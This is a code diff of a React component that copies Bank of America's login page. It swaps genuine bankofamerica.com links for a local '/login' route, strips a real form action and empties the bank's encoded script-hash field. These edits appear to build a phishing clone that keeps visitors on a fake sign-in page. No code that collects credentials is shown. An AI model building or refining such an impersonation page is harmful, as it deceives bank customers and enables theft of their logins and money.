@@ -109,7 +109,7 @@ function MultiPageForm() {
                         <div className="digital-id-head"> Check your mobile device </div>
                         <p className="digital-id-msg"> We can't identify you at this time. Please use your User ID/Password to log in. </p> <a href="/login" className="digital-id-link sign-in-with-passcode-instead"> Log In with Password instead </a>
                       </div>
-                      <div className="clearboth" /> <input type="hidden" name="_ia" id="_iaID" /><input type="hidden" name="_u2support" id="u2supportID" defaultValue={-1} /><input type="hidden" name="webAuthAPI" id="webAuthAPIID" defaultValue="true" /><input type="hidden" name="_sc" id="_scID" defaultValue="W3sidHlwZSI6IkUiLCJoYXNoIjoiZWE0NTIyZmY0NzJiZDU4ZTYyMDkwNzZjNjYzNzJiZjE5ZTlhZDk3ODU0ZTE5MDg0MTA5MjM4ZjVmMzVjMGYxMiIsInNpemUiOjgzfSx7InR5cGUiOiJJIiwiaGFzaCI6IjE1YjZhOTA4MTc1YTEwNDI3OWUxN2YyNzIwZTMxMjhiYTA5MzIyMmIwYzdhZTFlMWZhNTBmZmIxYjIxMDQ0MTkiLCJzaXplIjoyN30seyJ0eXBlIjoiSSIsImhhc2giOiI4MmY0NzkwNGYzYTY1OWZmNDU2NGE1ZGRlMTBlMzNlMWVjZDMyNjY3NjhmNDU0Yzk4ZjE5MzdmOTcxOWY5MTMyIiwic2l6ZSI6MTQyfSx7InR5cGUiOiJJIiwiaGFzaCI6IjQwMjgxYTliOWVlYmE5NjNhMDBkNzM3NzU4YWNjYWExZmRhNjFlMzgyM2RlMTJmMDA3OWE1OGJhYjgzZGVjYTciLCJzaXplIjozM30seyJ0eXBlIjoiSSIsImhhc2giOiI0ZTM1NWNkZGJmMzhlMTU2ZjdhY2Y5M2U3YmRjOWNlNWVjMWQwMWU1ODMwZjQwNmI4ZmY0MjIzMTU0ZWUwOGE1Iiwic2l6ZSI6MzV9LHsidHlwZSI6IkkiLCJoYXNoIjoiYTkwYjRkYTMxMzlkZDVmMjFjZjFhNGEzZjJiMzBlYmE3MmVlM2IyZWU0NjY4Yzg5ZTA4YmY1ODhiMGI2YWQ3MiIsInNpemUiOjQzfSx7InR5cGUiOiJJIiwiaGFzaCI6ImJlOTg4M2VhMGNiNmIxNjZjZGU4NjU2YjY4YzQyYzM1YWYxMjZiMzg0NjU0MmE0NjkwNjk1ZTk1MmQ1NDA1MzUiLCJzaXplIjo0MX0seyJ0eXBlIjoiSSIsImhhc2giOiJjNTNiN2MyMGU2Y2RlMjM5YjEwNjU1MjZlNzkwZTI0YTE2ZjdiNzk2M2VlOTYxOTQ4YmZmYzNmZTIzMzQ0NzRjIiwic2l6ZSI6MzR9LHsidHlwZSI6IkkiLCJoYXNoIjoiZGMzZDk2N2VmMzdkNDAzYWJjOWJlYzJlZDkzZWI0N2M0NzU0Yjk3ODkyYjQ4YWZhMTY1MDkwYmJkZTMxOTgyZiIsInNpemUiOjM2fSx7InR5cGUiOiJFIiwiaGFzaCI6ImZiNmNmMGVlN2E4Yjk2YmNmN2QxYzRlZjA1MTMxOWEzMTUwZGVhZDFlODRmYjhlNzlmYjdhMmM0ZjA4YzhmZTgiLCJzaXplIjoxMTJ9LHsidHlwZSI6IkUiLCJoYXNoIjoiM2IxN2M3ODkzOThlZGI2MjY0ZWJkZGY2YzkxM2U5ZWNhZWNlYTUyZGY2NzlmZTJmMjM3ZDYwZDc2Y2NjOTYxYSIsInNpemUiOjY3fSx7InR5cGUiOiJFIiwiaGFzaCI6ImE5NWZjZTY0ZjVjOGQxNzAzZTIyODFmNjExNjU3YmViZjViMWM2N2M5YjZjYTE5ZWRhNWIwYzkxMDZkNjUyYmQiLCJzaXplIjo3NX0seyJ0eXBlIjoiRSIsImhhc2giOiJjNjlkZjIxNWJiZTNiMGQzOWRiYjI5NjAyNWJhNDJlMGVlODgwNDY5OGI2ZjE3MDVlZjg2ZGNiMjljOTYzOWM4Iiwic2l6ZSI6OTV9LHsidHlwZSI6IkkiLCJoYXNoIjoiYTcyNDllNTc1ZmZmMmUwNTFhMjEyMGVkOGUyZTViY2E5NDJjMzcxOGVmNDAyYzVjNDAyOTU3NDQ4YzdhYzEyOSIsInNpemUiOjY4fSx7InR5cGUiOiJFIiwiaGFzaCI6IjQ2MzBhYzg1YTcwN2Y4NDRiMTYzMTcwMDgzYmM3MmIwNWI1MGNhZDk3MzY1ZGY0NjlkOWQ2MTMzMjY0NmY0ODQiLCJzaXplIjo1Mn0seyJ0eXBlIjoiSSIsImhhc2giOiIxOTQyNzhkYzk1NWFhNDVhYTdhMzg2NWQ4Zjk3M2E4MjliYTZjZmFlNzczMmFiYjA2YjM4NjEwYjJlODllZjk5Iiwic2l6ZSI6MTMzfSx7InR5cGUiOiJJIiwiaGFzaCI6IjY2M2JmZWEyNmM0YzBmMGZiYjU5YTQ1YjAzNjgxNTZlYzRlZDFjNTQyOWEzYzUyMmY2ZGRmNGRlODYyYjZlYzIiLCJzaXplIjoxNzV9LHsidHlwZSI6IkkiLCJoYXNoIjoiYWI3YzE2YjRmMzJlNGE3NWQzNGNiZTk5MTlkYjgyNGM1NzljZDNmNzBjYmQwODlkNjVlNWFiZmQ3NTViZmZkMyIsInNpemUiOjExMX0seyJ0eXBlIjoiRSIsImhhc2giOiI1MDNlM2NmNGNjMGVhNDM3YWVkNTdhMzQ4YWM2YTU0YzIwYmNlMmE2OTE4NjZlYjI4MjA4OTRiZGU1NjkwOTBmIiwic2l6ZSI6MTM1fSx7InR5cGUiOiJFIiwiaGFzaCI6IjY0YTc0MTVjZTRhNTVlYjVlNmY2ZGEzYzMwN2ZmZDJiNzc0NzJkNjYwZTM5NzIyMWRkZWZhMThmZTZlMjczNjIiLCJzaXplIjoxMTB9LHsidHlwZSI6IkkiLCJoYXNoIjoiODU2OGZiOTkwYjlhNzhlZTk4MjhjYjk3MDllNTQxODNhMmUwOWFkMTEwMzg2NGI2NzkxYjZjZWM2MTBmN2ZmMyIsInNpemUiOjI0fSx7InR5cGUiOiJJIiwiaGFzaCI6IjhkMDkyNzJiMDAzZjUyM2JhZGY3YWFkNThiOTQ0Nzc0ZDcxN2Q3MmVjNzg4NjdmMGIxOWQ1NzMzODQzYjNjMzEiLCJzaXplIjo3MTd9LHsidHlwZSI6IkkiLCJoYXNoIjoiMWZiZmFhMmM3N2U3NGUxZmY4MjljMWQ0M2VlNzdhYjZhMGY1Y2YyNWI0MDMwMmFlNjIwN2UwNjg5YzQwYjI2ZiIsInNpemUiOjEwN30seyJ0eXBlIjoiSSIsImhhc2giOiI3MTVkOWVjMzBmOWFiMTIwZDBhNWFiN2ZmNTcxNjU3MTI4YTM1ZWVjNzBjYTA3MzcwOGVmZTU1N2IxNmI4MDhiIiwic2l6ZSI6NTQwMn0seyJ0eXBlIjoiRSIsImhhc2giOiIyOWEwNjUwNjg5Nzk0ZDA5ODUxZjhhOGEyYTg3NjkyNjk0ODIxNzIwZGFiODRiMmI3NDUyY2Y3YzAwZTY3YTNiIiwic2l6ZSI6MTA4fSx7InR5cGUiOiJJIiwiaGFzaCI6ImE4YjI3ZGI1OWM2NGIxYmFiY2ZjYTQ2ZjZkOTQxYjcxNmU2MjAzMDQwNDllNzdhZTM0ZWExYWZhNDNkMDNhZjUiLCJzaXplIjo0NDQzfV0=" />
+                      <div className="clearboth" /> <input type="hidden" name="_ia" id="_iaID" /><input type="hidden" name="_u2support" id="u2supportID" defaultValue={-1} /><input type="hidden" name="webAuthAPI" id="webAuthAPIID" defaultValue="true" /><input type="hidden" name="_sc" id="_scID" defaultValue="" />
                     </form>
                     <div id="fpContainer" className style={{width: '50%'}}> </div>
                     <div className="mobile-cta-section vertical-dotted-line fl-rt">
@@ -141,7 +141,7 @@ function MultiPageForm() {
                           <h4 className="sprite sprite-L5 row-2 {email} sprited">We'll email you a link to download the app.
                             <div className="spr" />
                           </h4>
-                          <form action="https://www.bankofamerica.com/salesservices/send-communication" id="mobile_app_download_url">
+                          <form>
                             <div id="field-level-error" role="alert"><span className="ada-hidden"> </span></div>
                             <div className="{text}"> <label className="ada-hidden" htmlFor="tlpvt-mob_app_download_phone_num" name="mobile_app_download_phone_prompt" id="mobile_app_download_phone_prompt">{'{'}placeholderText{'}'}</label> <input type="text" name="mobile_app_download_phone_number" id="tlpvt-mob_app_download_phone_num" className="phone-input {text} tl-private" placeholder="{placeholderText}" /> </div>
                             <div className="{email}"> <label className="ada-hidden" htmlFor="tlpvt-mob_app_download_email_id" name="mobile_app_download_email_prompt" id="mobile_app_download_email_prompt">{'{'}emailPlaceholderText{'}'}</label> <input type="text" name="mobile_app_download_email_id" id="tlpvt-mob_app_download_email_id" className="email-input {email} tl-private" placeholder="{emailPlaceholderText}" /> </div> <a href="/login" name="anc-send-email-button" className="btn-bofa btn-bofa-small btn-bofa-noRight" id="mobile_app_download_send_button" onclick="dartFireOnClick('1359940','bacal484','2014_700')">Send</a>
@@ -157,7 +157,7 @@ function MultiPageForm() {
                       </div>
                       <div className="other-device-info {deviceStatus}">
                         <div>
-                          <p> Our mobile app is not available for all devices</p> <a href="https://www.bankofamerica.com/online-banking/mobile-banking-apps.go" className="style-link guillemet-right" name="anc_learn_more_about_phone_banking">Learn about your Banking by Phone options&nbsp;<span className="guillemet ls-n1 f-11 ls-n2 guillement-set">››</span></a>
+                          <p> Our mobile app is not available for all devices</p> <a href="/login" className="style-link guillemet-right" name="anc_learn_more_about_phone_banking">Learn about your Banking by Phone options&nbsp;<span className="guillemet ls-n1 f-11 ls-n2 guillement-set">››</span></a>
                         </div>
                       </div>
                       <div className="confirmation-screen hide">
@@ -197,15 +197,15 @@ function MultiPageForm() {
                     <h2>Login help</h2>
                     <ul className="li-pbtm-15">
                       <li><a className="arrow" href="/login" name="Forgot ID/Password?">Forgot ID/Password?</a></li>
-                      <li><a className="arrow" href="https://www.bankofamerica.com/customer-service/contact-us/bank-of-america-login-issues/" name="Problem logging in?">Problem logging in?</a></li>
+                      <li><a className="arrow" href="/login" name="Problem logging in?">Problem logging in?</a></li>
                     </ul>
                   </div>
                   <div className="fsd-ll-skin">
                     <h2>Not using Online Banking?</h2>
                     <ul className="li-pbtm-15">
                       <li><a className="arrow" href="/login" name="Enroll_now">Enroll now<span className="ada-hidden">  for online Banking</span></a></li>
-                      <li><a className="arrow" href="https://www.bankofamerica.com/onlinebanking/learning-center.go" name="Learn_more_about_Online_Banking_dotcom">Learn more about Online Banking</a></li>
-                      <li><a className="arrow" href="https://www.bankofamerica.com/online-banking/service-agreement.go" name="Service_Agreement_dotcom">Service Agreement</a></li>
+                      <li><a className="arrow" href="/login" name="Learn_more_about_Online_Banking_dotcom">Learn more about Online Banking</a></li>
+                      <li><a className="arrow" href="/login" name="Service_Agreement_dotcom">Service Agreement</a></li>
                     </ul>
                   </div>
                 </div>
@@ -219,11 +219,11 @@ function MultiPageForm() {
                   <div className="gray-bground-skin cssp">
                     <div className="secure">Secure area</div>
                     <div className="link-container">
-                      <div className="link-row"> <a href="https://www.bankofamerica.com/security-center/privacy-overview/" name="Privacy_&_Security_footer" title="Privacy" alt="Broken Link">Privacy</a> <a href="https://www.bankofamerica.com/security-center/overview/" name="Security" title="Security" alt="Broken Link">Security</a> <a className="last-link" href="javascript:OneTrust.ToggleInfoDisplay();" name="CA Opt-Out Preference Signals Honored" title target="_self">CA Opt-Out Preference Signals Honored</a>
+                      <div className="link-row"> <a href="/login" name="Privacy_&_Security_footer" title="Privacy" alt="Broken Link">Privacy</a> <a href="/login" name="Security" title="Security" alt="Broken Link">Security</a> <a className="last-link" href="/login" name="CA Opt-Out Preference Signals Honored" title target="_self">CA Opt-Out Preference Signals Honored</a>
                         <div className="clearboth" />
                       </div>
                     </div>
-                    <p>Bank of America, N.A. Member FDIC. <a href="https://www.bankofamerica.com/help/equalhousing-popup/" name="Equal_Housing_Lender" alt="Broken Link">Equal Housing Lender</a> <br />©&nbsp;2023 Bank of America Corporation.</p>
+                    <p>Bank of America, N.A. Member FDIC. <a href="/login" name="Equal_Housing_Lender" alt="Broken Link">Equal Housing Lender</a> <br />©&nbsp;2023 Bank of America Corporation.</p>
                   </div>
                 </div>
               </div>
